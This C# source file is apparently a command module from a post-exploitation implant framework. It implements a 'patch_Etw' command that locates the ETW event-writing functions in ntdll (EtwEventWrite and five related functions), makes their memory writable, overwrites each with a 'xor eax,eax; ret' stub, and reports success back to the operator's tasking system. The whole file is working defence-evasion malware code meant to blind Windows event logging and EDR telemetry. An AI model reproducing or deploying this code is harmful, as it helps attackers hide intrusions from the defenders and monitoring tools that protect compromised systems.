using Engineer.Extra;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Engineer.Models;
using Engineer.Functions;

namespace Engineer.Commands
{
    internal class Patch_ETW : EngineerCommand
    {
        public override string Name => "patch_Etw";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                if (IntPtr.Size == 8)
                {
                    byte[] patch = { 0x33, 0xC0, 0xC3 };
                    Patch(patch);
                }
                else
                {
                    byte[] patch = { 0x33, 0xC0, 0xC3 };
                    Patch(patch);
                }



                Tasking.FillTaskResults("ETW Patched with D/Invoke",task,EngTaskStatus.Complete);
            }
            catch (Exception e)
            {
                var error = "error: " + "[!] {patch failed}" + e.Message;
                Tasking.FillTaskResults(error, task, EngTaskStatus.Failed);
            }
        }

        private static void Patch(byte[] patch)
        {
            List<string> Modulelist = new List<string>() 
            {
            "EtwEventWrite",
            "EtwEventWriteEndScenario",
            "EtwEventWriteEx",
            "EtwEventWriteFull",
            "EtwEventWriteTransfer",
            "EtwWriteUMSecurityEvent"
            };
            
            foreach (string module in Modulelist)
            {
                try
                {
                    //get the address of the function
                    IntPtr ModuleBase = reprobate.GetPebLdrModuleEntry("ntdll.dll");
                    IntPtr functionAddress = reprobate.GetExportAddress(ModuleBase, module);

                    //make the address writable, I wanted to use getSyscallStub but with NtAllocateVirtualMemory and NtPtotect being called fro ma ammped version of the dll, its kind of pointless to use the syscall stub.
                    IntPtr patchLength = (IntPtr)patch.Length;
                    uint oldProtect = h_reprobate.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref functionAddress, ref patchLength, WinAPIs.Kernel32.PAGE_READWRITE);

                    // Patch function
                    Marshal.Copy(patch, 0, functionAddress, patch.Length);

                    // Restore memory permissions
                    uint newProtect = new uint();
                    h_reprobate.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref functionAddress, ref patchLength, oldProtect);
                }
                catch (Exception e)
                {

                    Console.WriteLine(e.Message);
                    Console.WriteLine($"module was {module}");
                }
               
            }
        }

    }
}
